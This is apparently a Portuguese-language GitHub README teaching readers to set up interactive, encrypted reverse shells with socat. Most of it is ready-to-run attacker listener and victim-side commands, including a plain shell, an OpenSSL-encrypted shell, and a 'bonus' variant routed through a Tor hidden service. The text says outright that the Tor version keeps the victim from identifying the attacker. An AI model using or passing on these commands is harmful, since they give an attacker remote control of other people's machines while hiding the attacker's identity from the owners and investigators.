<p align="center">

<h1 align="center"> Shell reverso interativo e criptografado 
<h1 align="center">

<img src="https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white" alt="Shell" />

<img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />

<img src="https://img.shields.io/badge/Debian-D70A53?style=for-the-badge&logo=debian&logoColor=white" alt="Debian.io" />

<img src="https://img.shields.io/badge/Tor-7D4698?style=for-the-badge&logo=Tor-Browser&logoColor=white" alt="Prisma.io" />

## O que é shell ?

Para entendermos o que é shell reverso, precisamos falar de shell. Podemos definir um shell como uma ligação entre o sistema e o usuário. Podemos dizer o shell tem a finalidade de interpretar comandos, transmiti-los ao sistema e devolver os resultados através do um terminal. A vários tipos de interpretadores shell em sistemas Unix/Linux sendo os mais comuns o sh , o bash ,csh o Tcsh , ksh , e o zsh.

## Shell Reverso

É uma técnica utilizada para enviar comandos de um shell remotamente por uma porta. Assim permite que o atacante abra uma porta de escuta em seu servidor e através dessa porta receber conexões de outras máquinas permitindo assim controla-las.

<p align="center">
  <a href="#" target="blank"><img src="https://media.geeksforgeeks.org/wp-content/uploads/20211126190050/reverseshell.png" alt="" /></a>
</p>

Com acesso a máquina comprometida, o atacante poderá escalar privilégios para ter acesso administrativo ao sistema.

Existem vários tipos de [shell reverso](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), mas utilizarei o socat.

Primeiramente instale o socat e o openssl:

```bash
$ apt install socat openssl
```

Poucas linhas de código são necessárias, basta o atacante abrir um terminal linux e executar o comando:

```bash
PORT=1111
socat file:`tty`,raw,echo=0 TCP-L:$PORT
```

A vítima deve deve ter o <strong>socat</strong> instalado e executar o seguinte comando em um terminal linux:

```bash
# host e porta do atacante
HOST=localhost
PORT=1111
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT

```

Abra duas instâncias do terminal e teste em localhost.

## Shell reverso criptografado

Atacante:

```shell

# Servidor

PORT="1111"

openssl req -x509 -sha256 -newkey rsa:2048 -keyout server.pem -out server.pem -days 1000 -nodes -subj "/C=NA/ST=NARNIA/L=HIDDEN/O=Global Security/OU=IT Department/CN=hidden.onion"

socat $(tty),raw,echo=0 openssl-listen:$PORT,reuseaddr,cert=server.pem,verify=0
```

Vítima:

```shell
# CLiente
HOST=localhost
PORT=80
socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
```

## Bônus

### Shell reverso utilizando a rede tor

Em sistemas robustos são guardados logs de conexões. Desta forma o endereço de ip da atacante seria facimente descoberto. Para tornar o endereço do atacante desconhecido, o atacante precisa ter o tor instalado:

```bash
apt install tor
```

Agora o atacante precisa possuir um servidor na rede tor, para isso a o atacante precisa adicionar as seguintes linhas ao arquivo <strong>/etc/tor/torrc</strong>

```
HiddenServiceDir /var/lib/tor/hidden/
HiddenServicePort 1111 127.0.0.1:1111
```

Reiniciar o tor:

```
systemctl restart tor
```

Para descobrir o host do atacante:

```bash
cat /var/lib/tor/service/hidden/hostname

# Aparecerá algo desse tipo
dominio-do-atacante.onion
```

O atacante deve executar:

```bash
PORT=1111
socat file:`tty`,raw,echo=0 TCP-L:$PORT
```

A vítima deverá ter o tor instalado, e deverá executar:

```bash
HOST=dominio-do-atacante.onion
PORT=1111
torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
```

## Observação

Vale lembrar que você pode criptografar o shell reverso na rede tor, mas por causa das camadas de criptografia da rede, a conexão ficará muito lenta! Mas agora é extremamente difícil para vitima identificar o atacante.

Abaixo nas referências, alguns caras muito respeitados no assunto de cyber security:

## **📚 Referências**

- [Van Houser](https://github.com/vanhauser-thc?tab=repositories) participação na série Mr. Robot, criador do hydra, [etc...](https://www.thc.org/)

- [Hackers-cheats](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

## **👨‍🚀 Autor**

<a href="https://github.com/tpaphysics">
<img alt="Thiago Pacheco" src="https://images.weserv.nl/?url=avatars.githubusercontent.com/u/46402647?v=4?v=4&h=300&w=300&fit=cover&mask=circle&maxage=7d" width="100px"/>
  <br />
  <sub>
    <b>Thiago Pacheco de Andrade</b>
  </sub>
</a>
<br />

👋 Meus contatos!

[![Linkedin Badge](https://img.shields.io/badge/-LinkedIn-blue?style=for-the-badge&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/thiago-pacheco-200a1a86/)](https://www.linkedin.com/in/thiago-pacheco-200a1a86/)
[![Gmail Badge](https://img.shields.io/badge/-Gmail-c14438?style=for-the-badge&logo=Gmail&logoColor=white&link=mailto:physics.posgrad.@gmail.com)](mailto:physics.posgrad.@gmail.com)

## Licença

Veja o arquivo [MIT license](LICENSE.md).
